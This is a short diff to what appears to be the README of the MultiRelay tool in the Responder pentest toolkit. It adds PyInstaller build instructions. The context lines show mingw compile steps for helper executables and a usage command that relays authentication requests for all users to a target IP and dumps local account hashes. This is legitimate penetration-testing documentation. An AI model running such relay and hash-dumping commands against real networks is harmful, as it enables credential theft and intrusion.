@@ -127,7 +127,9 @@ Requirements:
     cd Responder/tools/
     x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv    
     x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode     
+Compile yourself using Pyinstaller and force PyCrypto to be included:    
 
+    pyinstaller MultiRelay.py --hiddenimport=pycryptodomex --onefile              
 Usage:     
 
     /opt/Responder/tools $ python3 MultiRelay.py -t 172.16.1.5 -u ALL -d    #Relay auth requests for all users, dump local account hashes   
